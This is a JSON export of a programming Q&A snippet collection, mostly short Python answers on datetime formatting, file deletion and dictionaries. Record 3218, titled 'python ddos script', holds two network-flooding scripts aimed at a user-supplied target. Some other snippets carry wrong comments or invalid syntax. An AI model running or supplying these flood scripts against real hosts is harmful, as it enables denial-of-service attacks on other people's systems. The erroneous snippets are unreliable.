    "description": "# 10 July 2021, 10:54:27AM datetime.strftime(\"%-d %B %Y, %I:%M:%S%p\")\nThe program below converts a datetime object containing current date and time to different string formats.  Code:    from datetime import datetime  now = datetime.now() # current date and time  year = now.strftime(\"%Y\") print(\"year:\", year)  month = now.strftime(\"%m\") print(\"month:\", month)  day = now.strftime(\"%d\") print(\"day:\", day)  time = now.strftime(\"%H:%M:%S\") print(\"time:\", time)  date_time = now.strftime(\"%m/%d/%Y, %H:%M:%S\") print(\"date and time:\",date_time)\t  Output after run the code: year: 2020 month: 03 day: 31 time: 04:59:31 date and time: 03/31/2020, 04:59:31        Here, year, day, time and date_time are strings, whereas now is a datetime object.\n| Directive | Meaning                                                        | Example                 |  |-----------|------------------------------------------------------------------------------------------| |%a         | Abbreviated weekday name.                                      | Sun, Mon, ..            |  |%A         | Full weekday name.                                             | Sunday, Monday, ...     |  |%w         | Weekday as a decimal number.                                   | 0, 1, ..., 6            |  |%d         | Day of the month as a zero-padded decimal.                     | 01, 02, ..., 31         |  |%-d        | Day of the month as a decimal number.                          | 1, 2, ..., 30           |  |%b         | Abbreviated month name.                                        | Jan, Feb, ..., Dec      |  |%B         | Full month name.                                               | January, February, ...  |  |%m         | Month as a zero-padded decimal number.                         | 01, 02, ..., 12         |  |%-m        | Month as a decimal number.                                     | 1, 2, ..., 12           |  |%y         | Year without century as a zero-padded decimal number.          | 00, 01, ..., 99         |  |%-y        | Year without century as a decimal number.                      | 0, 1, ..., 99           |  |%Y         | Year with century as a decimal number.                         | 2013, 2019 etc.         |  |%H         | Hour (24-hour clock) as a zero-padded decimal number.          | 00, 01, ..., 23         |  |%-H        | Hour (24-hour clock) as a decimal number.                      | 0, 1, ..., 23           |  |%I         | Hour (12-hour clock) as a zero-padded decimal number.          | 01, 02, ..., 12         |  |%-I        | Hour (12-hour clock) as a decimal number.                      | 1, 2, ... 12            |  |%p         | Locale&rsquo;s AM or PM.                                             | AM, PM                  |  |%M         | Minute as a zero-padded decimal number.                        | 00, 01, ..., 59         |  |%-M        | Minute as a decimal number.                                    | 0, 1, ..., 59           |  |%S         | Second as a zero-padded decimal number.                        | 00, 01, ..., 59         |  |%-S        | Second as a decimal number.                                    | 0, 1, ..., 59           |  |%f         | Microsecond as a decimal number, zero-padded on the left.      | 000000 - 999999         |  |%z         | UTC offset in the form +HHMM or -HHMM.                         |                         |  |%Z         | Time zone name.                                                |                         |  |%j         | Day of the year as a zero-padded decimal number.               | 001, 002, ..., 366      |  |%-j        | Day of the year as a decimal number. 1, 2, ..., 366            |                         |  |%U         | Week number of the year (Sunday as the first day of the week). | 00, 01, ..., 53         |  |%W         | Week number of the year (Monday as the first day of the week). | 00, 01, ..., 53         |  |%c         | Locale&rsquo;s appropriate date and time representation.             | Mon Sep 30 07:06:05 2013| |%x         | Locale&rsquo;s appropriate date representation.                      | 09/30/13                |  |%X         | Locale&rsquo;s appropriate time representation.                      | 07:06:05                |  |%%         | A literal '%' character.                                       | %                       |  \n%a - Abbreviated weekday name. (Sun, Mon, ...) %A - Full weekday name. (Sunday, Monday, ...) %w - Weekday as a decimal number. (0, 1, ..., 6) %d - Day of the month as a zero-padded decimal. (01, 02, ..., 31) %-d - Day of the month as a decimal number. (1, 2, ..., 30) %b - Abbreviated month name. (Jan, Feb, ..., Dec) %B - Full month name. (January, February, ...) %m - Month as a zero-padded decimal number. (01, 02, ..., 12) %-m - Month as a decimal number. (1, 2, ..., 12) %y - Year without century as a zero-padded decimal number. (00, 01, ..., 99) %-y - Year without century as a decimal number. (0, 1, ..., 99) %Y - Year with century as a decimal number. (2013, 2019 etc.) %H - Hour (24-hour clock) as a zero-padded decimal number. (00, 01, ..., 23) %-H - Hour (24-hour clock) as a decimal number. (0, 1, ..., 23) %I - Hour (12-hour clock) as a zero-padded decimal number. (01, 02, ..., 12) %-I - Hour (12-hour clock) as a decimal number. (1, 2, ... 12) %p - Locale&rsquo;s AM or PM. (AM, PM) %M - Minute as a zero-padded decimal number. (00, 01, ..., 59) %-M - Minute as a decimal number. (0, 1, ..., 59) %S - Second as a zero-padded decimal number. (00, 01, ..., 59) %-S - Second as a decimal number. (0, 1, ..., 59) %f - Microsecond as a decimal number, zero-padded on the left.  (000000 - 999999) %z - UTC offset in the form +HHMM or -HHMM.   %Z - Time zone name.  %j - Day of the year as a zero-padded decimal number. (001, 002, ..., 366) %-j - Day of the year as a decimal number. (1, 2, ..., 366) %U - Week number of the year (Sunday as the first day of the week). All days in a new year preceding the first Sunday are considered to be in week 0. (00, 01, ..., 53) %W - Week number of the year (Monday as the first day of the week). All days in a new year preceding the first Monday are considered to be in week 0. (00, 01, ..., 53) %c - Locale&rsquo;s appropriate date and time representation. (Mon Sep 30 07:06:05 2013) %x - Locale&rsquo;s appropriate date representation. (09/30/13) %X - Locale&rsquo;s appropriate time representation. (07:06:05) %% - A literal '%' character. (%)\nimport datetime print(datetime.datetime.now()) #datetime.datetime.now() is the syntax \nimport datetime  x = datetime.datetime(2018, 9, 15)  print(x.strftime(\"%b %d %Y %H:%M:%S\")) \n",
    "reg_date": "2021-10-12T11:33:03.000Z"
  },
  {
    "id": 3204,
    "keyword": null,
    "link": null,
    "title": " python date get day",
    "description": "import datetime dt = datetime.datetime.today() year = dt.year month = dt.month day = dt.day\n",
    "reg_date": "2021-10-12T11:33:03.000Z"
  },
  {
    "id": 3205,
    "keyword": null,
    "link": null,
    "title": " python datetime date only",
    "description": "# Use the date() method: datetime.datetime.now().date()\nfrom datetime import datetime  custom_date_time = datetime(2021, 7, 23, 17, 30, 29, 431717) print(custom_date_time)  # Output: # 2021-07-23 17:30:29.431717 \ndatetime.datetime.now().date()\n",
    "reg_date": "2021-10-12T11:33:03.000Z"
  },
  {
    "id": 3206,
    "keyword": null,
    "link": null,
    "title": " python datetime module print 12 hour clock",
    "description": "from datetime import datetime  now = datetime.now()  print(now.strftime('%Y/%m/%d %H:%M:%S')) #24-hour format print(now.strftime('%Y/%m/%d %I:%M:%S')) #12-hour format \n",
    "reg_date": "2021-10-12T11:33:03.000Z"
  },
  {
    "id": 3207,
    "keyword": null,
    "link": null,
    "title": " python datetime now only hour and minute",
    "description": "from datetime import datetime hour_and_minute = datetime.now().strftime(\"%H:%M\") # \"14:09\"\n",
    "reg_date": "2021-10-12T11:33:03.000Z"
  },
  {
    "id": 3208,
    "keyword": null,
    "link": null,
    "title": " python datetime remove timezone",
    "description": "# dt_tz is a datetime.datetime object dt = dt_tz.replace(tzinfo=None) \n",
    "reg_date": "2021-10-12T11:33:03.000Z"
  },
  {
    "id": 3209,
    "keyword": null,
    "link": null,
    "title": " python datetime round to nearest hour",
    "description": "from datetime import datetime, timedelta  now = datetime.now()  def hour_rounder(t):     # Rounds to nearest hour by adding a timedelta hour if minute >= 30     return (t.replace(second=0, microsecond=0, minute=0, hour=t.hour)                +timedelta(hours=t.minute//30))  print(now) print(hour_rounder(now))\n",
    "reg_date": "2021-10-12T11:33:04.000Z"
  },
  {
    "id": 3210,
    "keyword": null,
    "link": null,
    "title": " python datetime string",
    "description": "import datetime  today = datetime.datetime.now() date_time = today.strftime(\"%m/%d/%Y, %H:%M:%S\") print(\"date and time:\",date_time)\n from datetime import datetime  now = datetime.now() # current date and time  year = now.strftime(\"%Y\") print(\"year:\", year)  month = now.strftime(\"%m\") print(\"month:\", month)  day = now.strftime(\"%d\") print(\"day:\", day)  time = now.strftime(\"%H:%M:%S\") print(\"time:\", time)  date_time = now.strftime(\"%m/%d/%Y, %H:%M:%S\") print(\"date and time:\",date_time)   ------------------------------------------------------------------------- Directive\tMeaning\tExample %a\tAbbreviated weekday name.\tSun, Mon, ... %A\tFull weekday name.\tSunday, Monday, ... %w\tWeekday as a decimal number.\t0, 1, ..., 6 %d\tDay of the month as a zero-padded decimal.\t01, 02, ..., 31 %-d\tDay of the month as a decimal number.\t1, 2, ..., 30 %b\tAbbreviated month name.\tJan, Feb, ..., Dec %B\tFull month name.\tJanuary, February, ... %m\tMonth as a zero-padded decimal number.\t01, 02, ..., 12 %-m\tMonth as a decimal number.\t1, 2, ..., 12 %y\tYear without century as a zero-padded decimal number.\t00, 01, ..., 99 %-y\tYear without century as a decimal number.\t0, 1, ..., 99 %Y\tYear with century as a decimal number.\t2013, 2019 etc. %H\tHour (24-hour clock) as a zero-padded decimal number.\t00, 01, ..., 23 %-H\tHour (24-hour clock) as a decimal number.\t0, 1, ..., 23 %I\tHour (12-hour clock) as a zero-padded decimal number.\t01, 02, ..., 12 %-I\tHour (12-hour clock) as a decimal number.\t1, 2, ... 12 %p\tLocale&rsquo;s AM or PM.\tAM, PM %M\tMinute as a zero-padded decimal number.\t00, 01, ..., 59 %-M\tMinute as a decimal number.\t0, 1, ..., 59 %S\tSecond as a zero-padded decimal number.\t00, 01, ..., 59 %-S\tSecond as a decimal number.\t0, 1, ..., 59 %f\tMicrosecond as a decimal number, zero-padded on the left.\t000000 - 999999 %z\tUTC offset in the form +HHMM or -HHMM.\t  %Z\tTime zone name.\t  %j\tDay of the year as a zero-padded decimal number.\t001, 002, ..., 366 %-j\tDay of the year as a decimal number.\t1, 2, ..., 366 %U\tWeek number of the year (Sunday as the first day of the week). All days in a new year preceding the first Sunday are considered to be in week 0.\t00, 01, ..., 53 %W\tWeek number of the year (Monday as the first day of the week). All days in a new year preceding the first Monday are considered to be in week 0.\t00, 01, ..., 53 %c\tLocale&rsquo;s appropriate date and time representation.\tMon Sep 30 07:06:05 2013 %x\tLocale&rsquo;s appropriate date representation.\t09/30/13 %X\tLocale&rsquo;s appropriate time representation.\t07:06:05 %%\tA literal '%' character.\t% ------------------------------------------------------------------------- \n| Directive | Meaning                                                        | Example                 |  |-----------|------------------------------------------------------------------------------------------| |%a         | Abbreviated weekday name.                                      | Sun, Mon, ..            |  |%A         | Full weekday name.                                             | Sunday, Monday, ...     |  |%w         | Weekday as a decimal number.                                   | 0, 1, ..., 6            |  |%d         | Day of the month as a zero-padded decimal.                     | 01, 02, ..., 31         |  |%-d        | Day of the month as a decimal number.                          | 1, 2, ..., 30           |  |%b         | Abbreviated month name.                                        | Jan, Feb, ..., Dec      |  |%B         | Full month name.                                               | January, February, ...  |  |%m         | Month as a zero-padded decimal number.                         | 01, 02, ..., 12         |  |%-m        | Month as a decimal number.                                     | 1, 2, ..., 12           |  |%y         | Year without century as a zero-padded decimal number.          | 00, 01, ..., 99         |  |%-y        | Year without century as a decimal number.                      | 0, 1, ..., 99           |  |%Y         | Year with century as a decimal number.                         | 2013, 2019 etc.         |  |%H         | Hour (24-hour clock) as a zero-padded decimal number.          | 00, 01, ..., 23         |  |%-H        | Hour (24-hour clock) as a decimal number.                      | 0, 1, ..., 23           |  |%I         | Hour (12-hour clock) as a zero-padded decimal number.          | 01, 02, ..., 12         |  |%-I        | Hour (12-hour clock) as a decimal number.                      | 1, 2, ... 12            |  |%p         | Locale&rsquo;s AM or PM.                                             | AM, PM                  |  |%M         | Minute as a zero-padded decimal number.                        | 00, 01, ..., 59         |  |%-M        | Minute as a decimal number.                                    | 0, 1, ..., 59           |  |%S         | Second as a zero-padded decimal number.                        | 00, 01, ..., 59         |  |%-S        | Second as a decimal number.                                    | 0, 1, ..., 59           |  |%f         | Microsecond as a decimal number, zero-padded on the left.      | 000000 - 999999         |  |%z         | UTC offset in the form +HHMM or -HHMM.                         |                         |  |%Z         | Time zone name.                                                |                         |  |%j         | Day of the year as a zero-padded decimal number.               | 001, 002, ..., 366      |  |%-j        | Day of the year as a decimal number. 1, 2, ..., 366            |                         |  |%U         | Week number of the year (Sunday as the first day of the week). | 00, 01, ..., 53         |  |%W         | Week number of the year (Monday as the first day of the week). | 00, 01, ..., 53         |  |%c         | Locale&rsquo;s appropriate date and time representation.             | Mon Sep 30 07:06:05 2013| |%x         | Locale&rsquo;s appropriate date representation.                      | 09/30/13                |  |%X         | Locale&rsquo;s appropriate time representation.                      | 07:06:05                |  |%%         | A literal '%' character.                                       | %                       |  \nfrom datetime import datetime  datetime_object = datetime.strptime('Jun 1 2005  1:33PM', '%b %d %Y %I:%M%p')\n from datetime import datetime  timestamp = 1528797322 date_time = datetime.fromtimestamp(timestamp)  print(\"Date time object:\", date_time)  d = date_time.strftime(\"%m/%d/%Y, %H:%M:%S\") print(\"Output 2:\", d)\t  d = date_time.strftime(\"%d %b, %Y\") print(\"Output 3:\", d)  d = date_time.strftime(\"%d %B, %Y\") print(\"Output 4:\", d)  d = date_time.strftime(\"%I%p\") print(\"Output 5:\", d) \n",
    "reg_date": "2021-10-12T11:33:04.000Z"
  },
  {
    "id": 3211,
    "keyword": null,
    "link": null,
    "title": " python datetime strptime hour minute second",
    "description": "import datetime date = '2021-05-21 11:22:03' datem = datetime.datetime.strptime(date, \"%Y-%m-%d %H:%M:%S\") print(datem.day)        # 25 print(datem.month)      # 5 print(datem.year)       # 2021 print(datem.hour)       # 11 print(datem.minute)     # 22 print(datem.second)     # 3\n",
    "reg_date": "2021-10-12T11:33:04.000Z"
  },
  {
    "id": 3212,
    "keyword": null,
    "link": null,
    "title": " python datetime to string iso 8601",
    "description": "from datetime import datetime my_date = datetime.now() print(my_date.strftime('%Y-%m-%dT%H:%M:%S.%f%z'))\nfrom datetime import datetime my_date = datetime.now() print(my_date.isoformat())\n__code-examples__python__python_datetime_to_string_iso_8601__?\nfrom datetime import datetime my_date = datetime.now() print(my_date.strftime('%Y-%m-%dT%H:%M:%S.%f%z'))\nfrom datetime import datetime my_date = datetime.now() print(my_date.isoformat())\n",
    "reg_date": "2021-10-12T11:33:04.000Z"
  },
  {
    "id": 3213,
    "keyword": null,
    "link": null,
    "title": " python datetime to utc",
    "description": "from datetime import timezone  timestamp = dt.replace(tzinfo=timezone.utc).timestamp()\ndt_object = datetime.fromtimestamp(timestamp)\n",
    "reg_date": "2021-10-12T11:33:04.000Z"
  },
  {
    "id": 3214,
    "keyword": null,
    "link": null,
    "title": " python datetime tomorrow date",
    "description": "datetime.date.today() + datetime.timedelta(days=1)\n",
    "reg_date": "2021-10-12T11:33:04.000Z"
  },
  {
    "id": 3215,
    "keyword": null,
    "link": null,
    "title": " python day from date",
    "description": "import datetime date = '2021-05-21 11:22:03' datem = datetime.datetime.strptime(date, \"%Y-%m-%d %H:%M:%S\") print(datem.day)        # 25 print(datem.month)      # 5 print(datem.year)       # 2021 print(datem.hour)       # 11 print(datem.minute)     # 22 print(datem.second)     # 3\nimport datetime dt = datetime.datetime.today() year = dt.year month = dt.month day = dt.day\n>>> import datetime >>> today = datetime.datetime.now() >>> print today 2009-03-06 15:37:02.484000 >>> today.strftime('%j') '065'\nfrom datetime import datetime  day_of_year = datetime.now().timetuple().tm_yday\n# int value range: 0-6, monday-sunday weekday = datetime.weekday()\n",
    "reg_date": "2021-10-12T11:33:04.000Z"
  },
  {
    "id": 3216,
    "keyword": null,
    "link": null,
    "title": " python day from datetime",
    "description": "import datetime date = '2021-05-21 11:22:03' datem = datetime.datetime.strptime(date, \"%Y-%m-%d %H:%M:%S\") print(datem.day)        # 25 print(datem.month)      # 5 print(datem.year)       # 2021 print(datem.hour)       # 11 print(datem.minute)     # 22 print(datem.second)     # 3\nimport datetime dt = datetime.datetime.today() year = dt.year month = dt.month day = dt.day\n>>> import datetime >>> today = datetime.datetime.now() >>> print today 2009-03-06 15:37:02.484000 >>> today.strftime('%j') '065'\n",
    "reg_date": "2021-10-12T11:33:04.000Z"
  },
  {
    "id": 3217,
    "keyword": null,
    "link": null,
    "title": " python day number from date",
    "description": "import datetime date = '2021-05-21 11:22:03' datem = datetime.datetime.strptime(date, \"%Y-%m-%d %H:%M:%S\") print(datem.day)        # 25 print(datem.month)      # 5 print(datem.year)       # 2021 print(datem.hour)       # 11 print(datem.minute)     # 22 print(datem.second)     # 3\n",
    "reg_date": "2021-10-12T11:33:04.000Z"
  },
  {
    "id": 3218,
    "keyword": null,
    "link": null,
    "title": " python ddos script",
    "description": "from scapy.all import * source_IP = input(\"Enter IP address of Source: \") target_IP = input(\"Enter IP address of Target: \") source_port = int(input(\"Enter Source Port Number:\")) i = 1  while True:    IP1 = IP(source_IP = source_IP, destination = target_IP)    TCP1 = TCP(srcport = source_port, dstport = 80)    pkt = IP1 / TCP1    send(pkt, inter = .001)        print (\"packet sent \", i)       i = i + 1\n#!/usr/bin/python3 import os import socket import sys import threading os.system(\"cls\") host = input(\"\\nEnter host: \") port = int(input(\"\\nEnter port: \")) print(\"\\n\") def run(h):     while True:         s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)         s.connect((host,port))         print(\"Packet send to \" + host) for i in range(5):     t = threading.Thread(target=run, args=[i])     t.start()\n",
    "reg_date": "2021-10-12T11:33:04.000Z"
  },
  {
    "id": 3219,
    "keyword": null,
    "link": null,
    "title": " python decimal()",
    "description": "Decimal is a python library that allows for more precise decimals, without a  large amount of floating point errors. from decimal import * getcontext().prec = n The above line let''s you change the precision of the decimal. i.e. getcontext().prec = 6 print(Decimal(1) / Decimal(7)) Decimal('0.142857') You can see that it has 6 digits of prescision. There are useful functions,  .log10 .sqrt .exp .ln First, Decimal(x).log10 returns log10(x). I.e. print(Decimal(100).log10) 2 Then, Decimal(x).sqrt returns the square root of a number (duh). Returns the square root of a number getcontext().prec = 28 Decimal(2).sqrt() Decimal('1.414213562373095048801688724') Then .exp is the natural anti-lograthm (natural lograthm is loge(x), where is e is Euler''s (say Oiler''s) constant, or 2.718... Since exponentiation is the opposite of lograthms, Decimal(x).exp = e**x getcontext().prec = 3 Decimal(1).exp() Decimal('2.718') Finally, .ln is the natural lograthm, or loge(x) . For more info check out  https://docs.python.org/3/library/decimal.html .\n>>> from decimal import * >>> getcontext().prec = 6 >>> Decimal(1) / Decimal(7) Decimal('0.142857') >>> getcontext().prec = 28 >>> Decimal(1) / Decimal(7) Decimal('0.1428571428571428571428571429') \n",
    "reg_date": "2021-10-12T11:33:05.000Z"
  },
  {
    "id": 3220,
    "keyword": null,
    "link": null,
    "title": " python decimal input",
    "description": "yourvariable = float(input(\"YOURE QUESTION HERE\"))\n",
    "reg_date": "2021-10-12T11:33:05.000Z"
  },
  {
    "id": 3221,
    "keyword": null,
    "link": null,
    "title": " python decrease gap between subplot rows",
    "description": "# Short answer: # If you have too much white space between rows (or columns) of a figure # with subplots, you can either shrink the vertical (or horizontal)  # dimensions of the figure with figsize so that they get more \"squished\" # together, or you can adjust the margin around the subplots fig, ax = plt.subplots(rows, cols, figsize=[24,12]) plt.subplots_adjust(bottom=0.3, top=0.7, hspace=0)\n",
    "reg_date": "2021-10-12T11:33:05.000Z"
  },
  {
    "id": 3222,
    "keyword": null,
    "link": null,
    "title": " python degrees to radians",
    "description": "# The function 'degrees()' converts an angle from radians to degrees import math math.degrees(angle)\n# The function 'radians()' converts an angle from degrees to radians import math math.radians(angle)\nfrom math import degrees, pi one_radian_in_degrees = degrees(pi) # one_radian_in_degrees = 180\n",
    "reg_date": "2021-10-12T11:33:05.000Z"
  },
  {
    "id": 3223,
    "keyword": null,
    "link": null,
    "title": " python delay",
    "description": "import time   # Wait for 5 seconds time.sleep(5)   # Wait for 300 milliseconds # .3 can also be used time.sleep(.300) \nimport time while True:     print(\"This prints once a minute.\")     time.sleep(60) # Delay for 1 minute (60 seconds).\nimport time  print(\"Printed immediately.\") time.sleep(2.4) print(\"Printed after 2.4 seconds.\")\n>>> import time >>> time.sleep(3) # Sleep for 3 seconds \nimport time  time.sleep(5) # sleeps for 5 seconds\nimport time time.sleep(3) #3s Delay!\n",
    "reg_date": "2021-10-12T11:33:05.000Z"
  },
  {
    "id": 3224,
    "keyword": null,
    "link": null,
    "title": " python delete all files in directory",
    "description": "import os  filelist = [ f for f in os.listdir(mydir) if f.endswith(\".bak\") ] for f in filelist:     os.remove(os.path.join(mydir, f))\nimport os import glob  files = glob.glob('/YOUR/PATH/*') for f in files:     os.remove(f) \n",
    "reg_date": "2021-10-12T11:33:05.000Z"
  },
  {
    "id": 3225,
    "keyword": null,
    "link": null,
    "title": " python delete contents of file",
    "description": "f = open('file.txt', 'r+') f.truncate(0)\nopen('file.txt', 'w').close()\n",
    "reg_date": "2021-10-12T11:33:05.000Z"
  },
  {
    "id": 3226,
    "keyword": null,
    "link": null,
    "title": " python delete duplicate lines in file",
    "description": "lines_seen = set() # holds lines already seen  with open(\"file.txt\", \"r+\") as f:     d = f.readlines()     f.seek(0)     for i in d:         if i not in lines_seen:             f.write(i)             lines_seen.add(i)     f.truncate()\nwith open(\"file.txt\", \"r\") as txt_file:   new_data = list(set(txt_file))   return new_data\n",
    "reg_date": "2021-10-12T11:33:05.000Z"
  },
  {
    "id": 3227,
    "keyword": null,
    "link": null,
    "title": " python delete file",
    "description": "import os filePath = '/home/somedir/Documents/python/logs'  if os.path.exists(filePath):     os.remove(filePath) else:     print(\"Can not delete the file as it doesn't exists\")\nimport os import shutil  if os.path.exists(\"demofile.txt\"):   os.remove(\"demofile.txt\") # one file at a time  os.rmdir(\"test_directory\") # removes empty directory shutil.rmtree(\"test_directory\") # removes not empty directory and its content \nimport os os.remove(\"filename.txt\")\nimport os os.remove(file) for file in os.listdir('path/to/directory') if file.endswith('.png')\nimport os os.remove(\"ChangedFile.csv\") print(\"File Removed!\")\nimport os if os.path.exists(\"demofile.txt\"):   os.remove(\"demofile.txt\") else:   print(\"The file does not exist\")\n",
    "reg_date": "2021-10-12T11:33:05.000Z"
  },
  {
    "id": 3228,
    "keyword": null,
    "link": null,
    "title": " python delete file with extension",
    "description": "import os  dir_name = \"/Users/ben/downloads/\" test = os.listdir(dir_name)  for item in test:     if item.endswith(\".zip\"):         os.remove(os.path.join(dir_name, item)) \nimport os print os.path.splitext(\"sample.txt\")[0]\n",
    "reg_date": "2021-10-12T11:33:05.000Z"
  },
  {
    "id": 3229,
    "keyword": null,
    "link": null,
    "title": " python delete key from dict",
    "description": "del dictionary['key']\n# Basic syntax: del dictionary['key']  # Example usage: dictionary = {'a': 3, 'b': 2, 'c': 3, 'd': 4, 'e': 5} del dictionary['c'] # Remove the 'c' key:value pair from dictionary dictionary --> {'a': 3, 'b': 2, 'd': 4, 'e': 5}\n>>> # initialise a dictionary with the keys &ldquo;city&rdquo;, &ldquo;name&rdquo;, &ldquo;food&rdquo; >>> person1_information = {'city': 'San Francisco', 'name': 'Sam', \"food\": \"shrimps\"}  >>> # delete the key, value pair with the key &ldquo;food&rdquo; >>> del person1_information[\"food\"]  >>> # print the present personal1_information. Note that the key, value pair &ldquo;food&rdquo;: &ldquo;shrimps&rdquo; is not there anymore. >>> print(person1_information) {'city': 'San Francisco', 'name': 'Sam'}\ndictionary.pop(key)\nthisdict = {   \"brand\": \"Ford\",   \"model\": \"Mustang\",   \"year\": 1964 } thisdict.pop(\"model\")\ndict.pop(\"key\")\n",
    "reg_date": "2021-10-12T11:33:06.000Z"
  },
  {
    "id": 3230,
    "keyword": null,
    "link": null,
    "title": " python delete none from list",
    "description": ">>> L = [0, 23, 234, 89, None, 0, 35, 9] >>> [x for x in L if x is not None] [0, 23, 234, 89, 0, 35, 9]\n",
    "reg_date": "2021-10-12T11:33:06.000Z"
  },
  {
    "id": 3231,
    "keyword": null,
    "link": null,
    "title": " python delete saved image",
    "description": "import os os.remove(file) for file in os.listdir('path/to/directory') if file.endswith('.png')\n",
    "reg_date": "2021-10-12T11:33:06.000Z"
  },
  {
    "id": 3232,
    "keyword": null,
    "link": null,
    "title": " python delete text in text file",
    "description": "# Delete all text in a text file f = open(\"text_file.txt\", \"r+\") f.truncate(0) f.close()\n",
    "reg_date": "2021-10-12T11:33:06.000Z"
  },
  {
    "id": 3233,
    "keyword": null,
    "link": null,
    "title": " python delete the last line of console",
    "description": "print(\"This message will remain\") print(\"This message will be deleted\", end=\"\\r\") #NOTE: If you run it in IDLE by pressing F5, the shell will still display# #both messages, however, if you run the program by double clicking# #then the ouput console will delete it!#\n",
    "reg_date": "2021-10-12T11:33:06.000Z"
  },
  {
    "id": 3234,
    "keyword": null,
    "link": null,
    "title": " python desktop notifier",
    "description": "pip install plyer  #for creating notifications on your PC :)\n",
    "reg_date": "2021-10-12T11:33:06.000Z"
  },
  {
    "id": 3235,
    "keyword": null,
    "link": null,
    "title": " python detect if tkinter page closed",
    "description": "import tkinter as tk from tkinter import messagebox  root = tk.Tk()  def on_closing():     if messagebox.askokcancel(\"Quit\", \"Do you want to quit?\"):         root.destroy()  root.protocol(\"WM_DELETE_WINDOW\", on_closing) root.mainloop()\n",
    "reg_date": "2021-10-12T11:33:06.000Z"
  },
  {
    "id": 3236,
    "keyword": null,
    "link": null,
    "title": " python detect internet connection",
    "description": "import urllib2  def internet_on():     try:         urllib2.urlopen('http://216.58.192.142', timeout=1)         return True     except urllib2.URLError as err:          return False\ntry:     import httplib except:     import http.client as httplib  def have_internet():     conn = httplib.HTTPConnection(\"www.google.com\", timeout=5)     try:         conn.request(\"HEAD\", \"/\")         conn.close()         return True     except:         conn.close()         return False # Code by Ivelin on Stack overflow\n",
    "reg_date": "2021-10-12T11:33:06.000Z"
  },
  {
    "id": 3237,
    "keyword": null,
    "link": null,
    "title": " python dict class",
    "description": "list.append(x) # append x to end of list list.extend(iterable) # append all elements of iterable to list list.insert(i, x) # insert x at index i list.remove(x) # remove first occurance of x from list list.pop([i]) # pop element at index i (defaults to end of list) list.clear() # delete all elements from the list list.index(x[, start[, end]]) # return index of element x list.count(x) # return number of occurances of x in list list.reverse() # reverse elements of list in-place (no return) list.sort(key=None, reverse=False) # sort list in-place list.copy() # return a shallow copy of the list\n",
    "reg_date": "2021-10-12T11:33:06.000Z"
  },
  {
    "id": 3238,
    "keyword": null,
    "link": null,
    "title": " python dict enumerate",
    "description": "for i, (k, v) in enumerate(example_dict.items()):     print(i, k, v)\n",
    "reg_date": "2021-10-12T11:33:06.000Z"
  },
  {
    "id": 3239,
    "keyword": null,
    "link": null,
    "title": " python dict exclude keys",
    "description": ">>> my_dict = { ...     \"keyA\": 1, ...     \"keyB\": 2, ...     \"keyC\": 3 ... } >>> invalid = {\"keyA\", \"keyB\"} >>> def without_keys(d, keys): ...     return {x: d[x] for x in d if x not in keys} >>> without_keys(my_dict, invalid) {'keyC': 3}\n",
    "reg_date": "2021-10-12T11:33:07.000Z"
  },
  {
    "id": 3240,
    "keyword": null,
    "link": null,
    "title": " python dict from list of tuples",
    "description": ">>> my_list = [('a', 1), ('b', 2)] >>> dict(my_list) {'a': 1, 'b': 2} \n",
    "reg_date": "2021-10-12T11:33:07.000Z"
  },
  {
    "id": 3241,
    "keyword": null,
    "link": null,
    "title": " python dict to url params",
    "description": ">>> import urllib >>> urllib.urlencode({'p': [1, 2, 3]}, doseq=True) 'p=1&p=2&p=3'\n",
    "reg_date": "2021-10-12T11:33:07.000Z"
  },
  {
    "id": 3242,
    "keyword": null,
    "link": null,
    "title": " python dictionary default value if key doesn't exist",
    "description": "value = d.get(key)\t\t\t\t# Null value = d.get(key, \"empty\")\t\t# empty\nd = {} r = d.get('missing_key', None) \nvalue = d.get(key, \"Default value\") if key not found in dictonary ,it will return default value\n",
    "reg_date": "2021-10-12T11:33:07.000Z"
  },
  {
    "id": 3243,
    "keyword": null,
    "link": null,
    "title": " python dictionary dot product",
    "description": "dot_product = sum(dict_1[key]*dict_2.get(key, 0) for key in dict_1)\n",
    "reg_date": "2021-10-12T11:33:07.000Z"
  },
  {
    "id": 3244,
    "keyword": null,
    "link": null,
    "title": " python dictionary if not found",
    "description": "value = d.get(key)\t\t\t\t# Null value = d.get(key, \"empty\")\t\t# empty\n",
    "reg_date": "2021-10-12T11:33:07.000Z"
  },
  {
    "id": 3245,
    "keyword": null,
    "link": null,
    "title": " python difference between two numbers",
    "description": "# use abs(). It doesn't matter which number is larger. >>> abs(10 - 5) 5 >>> abs(-15 - 5) 15\n",
    "reg_date": "2021-10-12T11:33:07.000Z"
  },
  {
    "id": 3246,
    "keyword": null,
    "link": null,
    "title": " python difference in dates in seconds",
    "description": "future_date = datetime.datetime(1970, 1, 2) past_date = datetime.datetime(1970, 1, 1)  difference = (future_date - past_date) Calculate difference in time   total_seconds = difference.total_seconds() Convert time difference to seconds   print(total_seconds) OUTPUT 86400.0\n",
    "reg_date": "2021-10-12T11:33:07.000Z"
  },
  {
    "id": 3247,
    "keyword": null,
    "link": null,
    "title": " python difference in time",
    "description": ">>> import datetime >>> a = datetime.datetime.now() >>> b = datetime.datetime.now() >>> c = b - a  >>> c datetime.timedelta(0, 4, 316543) >>> c.days 0 >>> c.seconds 4 >>> c.microseconds 316543\nfrom datetime import datetime import time  datetime1 = datetime.datetime.now() # Wait for 1 minute time.sleep(60)  datetime2 = datetime.datetime.now()  difference = datetime2 - datetime1 print(f\"The time difference between the 2 time is: {difference}\")\nimport datetime as dt  a = dt.datetime(2013,12,30,23,59,59) b = dt.datetime(2013,12,31,23,59,59)  (b-a).total_seconds()\n",
    "reg_date": "2021-10-12T11:33:07.000Z"
  },
  {
    "id": 3248,
    "keyword": null,
    "link": null,
    "title": " python directory contains file",
    "description": "import os.path  if os.path.isfile('filename.txt'):     print (\"File exist\") else:     print (\"File not exist\")\n",
    "reg_date": "2021-10-12T11:33:07.000Z"
  },
  {
    "id": 3249,
    "keyword": null,
    "link": null,
    "title": " python discord bot command permissions",
